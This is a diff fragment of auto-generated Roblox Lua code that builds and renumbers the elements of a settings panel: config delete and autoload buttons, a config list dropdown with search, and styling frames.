+G2L["ac"] = Instance.new("TextButton", G2L["ab"]);
+G2L["ac"]["BorderSizePixel"] = 0;
+G2L["ac"]["TextTransparency"] = 1;
+G2L["ac"]["TextSize"] = 14;
+G2L["ac"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["ac"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["ac"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["ac"]["ZIndex"] = 49;
+G2L["ac"]["BackgroundTransparency"] = 1;
+G2L["ac"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["ac"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["ac"]["Name"] = [[button]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.delete.button.UIPadding
-G2L["7f"] = Instance.new("UIPadding", G2L["7e"]);
-G2L["7f"]["PaddingTop"] = UDim.new(0, 2);
-G2L["7f"]["PaddingRight"] = UDim.new(0, 3);
-G2L["7f"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["7f"]["PaddingBottom"] = UDim.new(0, 2);
+G2L["ad"] = Instance.new("UIPadding", G2L["ac"]);
+G2L["ad"]["PaddingTop"] = UDim.new(0, 2);
+G2L["ad"]["PaddingRight"] = UDim.new(0, 3);
+G2L["ad"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["ad"]["PaddingBottom"] = UDim.new(0, 2);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.delete.button.buttonFrame
-G2L["80"] = Instance.new("Frame", G2L["7e"]);
-G2L["80"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["80"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["80"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["80"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["80"]["Name"] = [[buttonFrame]];
+G2L["ae"] = Instance.new("Frame", G2L["ac"]);
+G2L["ae"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["ae"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["ae"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["ae"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["ae"]["Name"] = [[buttonFrame]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.delete.button.buttonFrame.outlineStroke
-G2L["81"] = Instance.new("UIStroke", G2L["80"]);
-G2L["81"]["Thickness"] = 2;
-G2L["81"]["Name"] = [[outlineStroke]];
+G2L["af"] = Instance.new("UIStroke", G2L["ae"]);
+G2L["af"]["Thickness"] = 2;
+G2L["af"]["Name"] = [[outlineStroke]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.delete.button.buttonFrame.buttonFade
-G2L["82"] = Instance.new("CanvasGroup", G2L["80"]);
-G2L["82"]["BorderSizePixel"] = 0;
-G2L["82"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["82"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["82"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["82"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["82"]["Name"] = [[buttonFade]];
+G2L["b0"] = Instance.new("CanvasGroup", G2L["ae"]);
+G2L["b0"]["BorderSizePixel"] = 0;
+G2L["b0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["b0"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b0"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["b0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b0"]["Name"] = [[buttonFade]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.delete.button.buttonFrame.buttonFade.UIGradient
-G2L["83"] = Instance.new("UIGradient", G2L["82"]);
-G2L["83"]["Rotation"] = 90;
-G2L["83"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+G2L["b1"] = Instance.new("UIGradient", G2L["b0"]);
+G2L["b1"]["Rotation"] = 90;
+G2L["b1"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.delete.button.text
-G2L["84"] = Instance.new("TextLabel", G2L["7e"]);
-G2L["84"]["ZIndex"] = 2;
-G2L["84"]["BorderSizePixel"] = 0;
-G2L["84"]["TextSize"] = 14;
-G2L["84"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["84"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["84"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["84"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["84"]["BackgroundTransparency"] = 1;
-G2L["84"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["84"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["84"]["Text"] = [[Delete config]];
-G2L["84"]["Name"] = [[text]];
+G2L["b2"] = Instance.new("TextLabel", G2L["ac"]);
+G2L["b2"]["ZIndex"] = 2;
+G2L["b2"]["BorderSizePixel"] = 0;
+G2L["b2"]["TextSize"] = 14;
+G2L["b2"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["b2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["b2"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["b2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["b2"]["BackgroundTransparency"] = 1;
+G2L["b2"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["b2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b2"]["Text"] = [[Delete config]];
+G2L["b2"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.delete.button.text.text
-G2L["85"] = Instance.new("UIStroke", G2L["84"]);
-G2L["85"]["Name"] = [[text]];
+G2L["b3"] = Instance.new("UIStroke", G2L["b2"]);
+G2L["b3"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.delete.fillbar
-G2L["86"] = Instance.new("Frame", G2L["7d"]);
-G2L["86"]["ZIndex"] = 90;
-G2L["86"]["BorderSizePixel"] = 0;
-G2L["86"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["86"]["Size"] = UDim2.new(0, 0, 1, 0);
-G2L["86"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["86"]["Name"] = [[fillbar]];
-G2L["86"]["BackgroundTransparency"] = 0.95;
+G2L["b4"] = Instance.new("Frame", G2L["ab"]);
+G2L["b4"]["ZIndex"] = 90;
+G2L["b4"]["BorderSizePixel"] = 0;
+G2L["b4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["b4"]["Size"] = UDim2.new(0, 0, 1, 0);
+G2L["b4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b4"]["Name"] = [[fillbar]];
+G2L["b4"]["BackgroundTransparency"] = 0.95;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.setautoload
-G2L["87"] = Instance.new("Frame", G2L["3e"]);
-G2L["87"]["BorderSizePixel"] = 0;
-G2L["87"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["87"]["Size"] = UDim2.new(1, 0, 0, 23);
-G2L["87"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["87"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["87"]["Name"] = [[setautoload]];
-G2L["87"]["LayoutOrder"] = 8;
-G2L["87"]["BackgroundTransparency"] = 1;
+G2L["b5"] = Instance.new("Frame", G2L["6c"]);
+G2L["b5"]["BorderSizePixel"] = 0;
+G2L["b5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["b5"]["Size"] = UDim2.new(1, 0, 0, 23);
+G2L["b5"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["b5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b5"]["Name"] = [[setautoload]];
+G2L["b5"]["LayoutOrder"] = 8;
+G2L["b5"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.setautoload.button
-G2L["88"] = Instance.new("TextButton", G2L["87"]);
-G2L["88"]["BorderSizePixel"] = 0;
-G2L["88"]["TextTransparency"] = 1;
-G2L["88"]["TextSize"] = 14;
-G2L["88"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["88"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["88"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["88"]["ZIndex"] = 49;
-G2L["88"]["BackgroundTransparency"] = 1;
-G2L["88"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["88"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["88"]["Name"] = [[button]];
+G2L["b6"] = Instance.new("TextButton", G2L["b5"]);
+G2L["b6"]["BorderSizePixel"] = 0;
+G2L["b6"]["TextTransparency"] = 1;
+G2L["b6"]["TextSize"] = 14;
+G2L["b6"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["b6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["b6"]["ZIndex"] = 49;
+G2L["b6"]["BackgroundTransparency"] = 1;
+G2L["b6"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["b6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b6"]["Name"] = [[button]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.setautoload.button.UIPadding
-G2L["89"] = Instance.new("UIPadding", G2L["88"]);
-G2L["89"]["PaddingTop"] = UDim.new(0, 2);
-G2L["89"]["PaddingRight"] = UDim.new(0, 3);
-G2L["89"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["89"]["PaddingBottom"] = UDim.new(0, 2);
+G2L["b7"] = Instance.new("UIPadding", G2L["b6"]);
+G2L["b7"]["PaddingTop"] = UDim.new(0, 2);
+G2L["b7"]["PaddingRight"] = UDim.new(0, 3);
+G2L["b7"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["b7"]["PaddingBottom"] = UDim.new(0, 2);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.setautoload.button.buttonFrame
-G2L["8a"] = Instance.new("Frame", G2L["88"]);
-G2L["8a"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["8a"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["8a"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["8a"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["8a"]["Name"] = [[buttonFrame]];
+G2L["b8"] = Instance.new("Frame", G2L["b6"]);
+G2L["b8"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["b8"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["b8"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["b8"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["b8"]["Name"] = [[buttonFrame]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.setautoload.button.buttonFrame.outlineStroke
-G2L["8b"] = Instance.new("UIStroke", G2L["8a"]);
-G2L["8b"]["Thickness"] = 2;
-G2L["8b"]["Name"] = [[outlineStroke]];
+G2L["b9"] = Instance.new("UIStroke", G2L["b8"]);
+G2L["b9"]["Thickness"] = 2;
+G2L["b9"]["Name"] = [[outlineStroke]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.setautoload.button.buttonFrame.buttonFade
-G2L["8c"] = Instance.new("CanvasGroup", G2L["8a"]);
-G2L["8c"]["BorderSizePixel"] = 0;
-G2L["8c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["8c"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["8c"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["8c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["8c"]["Name"] = [[buttonFade]];
+G2L["ba"] = Instance.new("CanvasGroup", G2L["b8"]);
+G2L["ba"]["BorderSizePixel"] = 0;
+G2L["ba"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["ba"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["ba"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["ba"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["ba"]["Name"] = [[buttonFade]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.setautoload.button.buttonFrame.buttonFade.UIGradient
-G2L["8d"] = Instance.new("UIGradient", G2L["8c"]);
-G2L["8d"]["Rotation"] = 90;
-G2L["8d"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+G2L["bb"] = Instance.new("UIGradient", G2L["ba"]);
+G2L["bb"]["Rotation"] = 90;
+G2L["bb"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.setautoload.button.text
-G2L["8e"] = Instance.new("TextLabel", G2L["88"]);
-G2L["8e"]["ZIndex"] = 2;
-G2L["8e"]["BorderSizePixel"] = 0;
-G2L["8e"]["TextSize"] = 14;
-G2L["8e"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["8e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["8e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["8e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["8e"]["BackgroundTransparency"] = 1;
-G2L["8e"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["8e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["8e"]["Text"] = [[Set as autoload]];
-G2L["8e"]["Name"] = [[text]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.setautoload.button.text.text
-G2L["8f"] = Instance.new("UIStroke", G2L["8e"]);
-G2L["8f"]["Name"] = [[text]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.setautoload.fillbar
-G2L["90"] = Instance.new("Frame", G2L["87"]);
-G2L["90"]["ZIndex"] = 90;
-G2L["90"]["BorderSizePixel"] = 0;
-G2L["90"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["90"]["Size"] = UDim2.new(0, 0, 1, 0);
-G2L["90"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["90"]["Name"] = [[fillbar]];
-G2L["90"]["BackgroundTransparency"] = 0.95;
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.autoloadtext
-G2L["91"] = Instance.new("Frame", G2L["3e"]);
-G2L["91"]["BorderSizePixel"] = 0;
-G2L["91"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["91"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["91"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
-G2L["91"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["91"]["Name"] = [[autoloadtext]];
-G2L["91"]["LayoutOrder"] = 10;
-G2L["91"]["BackgroundTransparency"] = 1;
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.autoloadtext.text
-G2L["92"] = Instance.new("TextLabel", G2L["91"]);
-G2L["92"]["TextWrapped"] = true;
-G2L["92"]["ZIndex"] = 10;
-G2L["92"]["BorderSizePixel"] = 0;
-G2L["92"]["TextSize"] = 14;
-G2L["92"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["92"]["TextYAlignment"] = Enum.TextYAlignment.Top;
-G2L["92"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["92"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["92"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["92"]["BackgroundTransparency"] = 1;
-G2L["92"]["Size"] = UDim2.new(1, 0, 1.18729, 0);
-G2L["92"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["92"]["Text"] = [[Autoload: none]];
-G2L["92"]["Name"] = [[text]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.autoloadtext.text.UIPadding
-G2L["93"] = Instance.new("UIPadding", G2L["92"]);
-G2L["93"]["PaddingTop"] = UDim.new(0, 2);
-G2L["93"]["PaddingRight"] = UDim.new(0, 6);
-G2L["93"]["PaddingLeft"] = UDim.new(0, 6);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.autoloadtext.text.text
-G2L["94"] = Instance.new("UIStroke", G2L["92"]);
-G2L["94"]["Name"] = [[text]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown
-G2L["95"] = Instance.new("Frame", G2L["3e"]);
-G2L["95"]["BorderSizePixel"] = 0;
-G2L["95"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["95"]["Size"] = UDim2.new(1, 0, 0, 23);
-G2L["95"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["95"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["95"]["Name"] = [[configlistdropdown]];
-G2L["95"]["LayoutOrder"] = 7;
-G2L["95"]["BackgroundTransparency"] = 1;
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button
-G2L["96"] = Instance.new("TextButton", G2L["95"]);
-G2L["96"]["BorderSizePixel"] = 0;
-G2L["96"]["TextTransparency"] = 1;
-G2L["96"]["TextSize"] = 14;
-G2L["96"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["96"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["96"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["96"]["ZIndex"] = 89;
-G2L["96"]["BackgroundTransparency"] = 1;
-G2L["96"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["96"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["96"]["Name"] = [[button]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.UIPadding
-G2L["97"] = Instance.new("UIPadding", G2L["96"]);
-G2L["97"]["PaddingTop"] = UDim.new(0, 2);
-G2L["97"]["PaddingRight"] = UDim.new(0, 3);
-G2L["97"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["97"]["PaddingBottom"] = UDim.new(0, 2);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.dropdownFrame
-G2L["98"] = Instance.new("Frame", G2L["96"]);
-G2L["98"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["98"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["98"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["98"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["98"]["Name"] = [[dropdownFrame]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.dropdownFrame.outlineStroke
-G2L["99"] = Instance.new("UIStroke", G2L["98"]);
-G2L["99"]["Thickness"] = 2;
-G2L["99"]["Name"] = [[outlineStroke]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.dropdownFrame.buttonFade
-G2L["9a"] = Instance.new("CanvasGroup", G2L["98"]);
-G2L["9a"]["BorderSizePixel"] = 0;
-G2L["9a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["9a"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["9a"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["9a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["9a"]["Name"] = [[buttonFade]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.dropdownFrame.buttonFade.UIGradient
-G2L["9b"] = Instance.new("UIGradient", G2L["9a"]);
-G2L["9b"]["Rotation"] = 90;
-G2L["9b"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.text
-G2L["9c"] = Instance.new("TextLabel", G2L["96"]);
-G2L["9c"]["ZIndex"] = 2;
-G2L["9c"]["BorderSizePixel"] = 0;
-G2L["9c"]["TextSize"] = 14;
-G2L["9c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["9c"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["9c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["9c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["9c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["9c"]["BackgroundTransparency"] = 1;
-G2L["9c"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["9c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["9c"]["Text"] = [[--]];
-G2L["9c"]["Name"] = [[text]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.text.text
-G2L["9d"] = Instance.new("UIStroke", G2L["9c"]);
-G2L["9d"]["Name"] = [[text]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.text.UIPadding
-G2L["9e"] = Instance.new("UIPadding", G2L["9c"]);
-G2L["9e"]["PaddingLeft"] = UDim.new(0, 6);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.arrow
-G2L["9f"] = Instance.new("TextButton", G2L["96"]);
-G2L["9f"]["BorderSizePixel"] = 0;
-G2L["9f"]["TextSize"] = 12;
-G2L["9f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["9f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["9f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["9f"]["ZIndex"] = 99;
-G2L["9f"]["BackgroundTransparency"] = 1;
-G2L["9f"]["Size"] = UDim2.new(0, 25, 1, 0);
-G2L["9f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["9f"]["Text"] = [[▲]];
-G2L["9f"]["Name"] = [[arrow]];
-G2L["9f"]["Rotation"] = 180;
-G2L["9f"]["Position"] = UDim2.new(1, -25, 0, 0);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.search
-G2L["a0"] = Instance.new("TextBox", G2L["96"]);
-G2L["a0"]["Visible"] = false;
-G2L["a0"]["Name"] = [[search]];
-G2L["a0"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["a0"]["PlaceholderColor3"] = Color3.fromRGB(201, 201, 201);
-G2L["a0"]["BorderSizePixel"] = 0;
-G2L["a0"]["TextWrapped"] = true;
-G2L["a0"]["TextSize"] = 14;
-G2L["a0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["a0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["a0"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["a0"]["PlaceholderText"] = [[Search...]];
-G2L["a0"]["Size"] = UDim2.new(1, -25, 1, 0);
-G2L["a0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["a0"]["Text"] = [[]];
-G2L["a0"]["BackgroundTransparency"] = 1;
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.search.UIPadding
-G2L["a1"] = Instance.new("UIPadding", G2L["a0"]);
-G2L["a1"]["PaddingLeft"] = UDim.new(0, 6);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.search.text
-G2L["a2"] = Instance.new("UIStroke", G2L["a0"]);
-G2L["a2"]["Name"] = [[text]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.fillbar
-G2L["a3"] = Instance.new("Frame", G2L["95"]);
-G2L["a3"]["ZIndex"] = 90;
-G2L["a3"]["BorderSizePixel"] = 0;
-G2L["a3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["a3"]["Size"] = UDim2.new(0, 0, 1, 0);
-G2L["a3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["a3"]["Name"] = [[fillbar]];
-G2L["a3"]["BackgroundTransparency"] = 0.95;
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistLABEL
-G2L["a4"] = Instance.new("Frame", G2L["3e"]);
-G2L["a4"]["BorderSizePixel"] = 0;
-G2L["a4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["a4"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["a4"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
-G2L["a4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["a4"]["Name"] = [[configlistLABEL]];
-G2L["a4"]["LayoutOrder"] = 6;
-G2L["a4"]["BackgroundTransparency"] = 1;
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistLABEL.text
-G2L["a5"] = Instance.new("TextLabel", G2L["a4"]);
-G2L["a5"]["TextWrapped"] = true;
-G2L["a5"]["ZIndex"] = 10;
-G2L["a5"]["BorderSizePixel"] = 0;
-G2L["a5"]["TextSize"] = 14;
-G2L["a5"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["a5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["a5"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["a5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["a5"]["BackgroundTransparency"] = 1;
-G2L["a5"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["a5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["a5"]["Text"] = [[Config list]];
-G2L["a5"]["Name"] = [[text]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistLABEL.text.UIPadding
-G2L["a6"] = Instance.new("UIPadding", G2L["a5"]);
-G2L["a6"]["PaddingLeft"] = UDim.new(0, 6);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistLABEL.text.text
-G2L["a7"] = Instance.new("UIStroke", G2L["a5"]);
-G2L["a7"]["Name"] = [[text]];
-
-
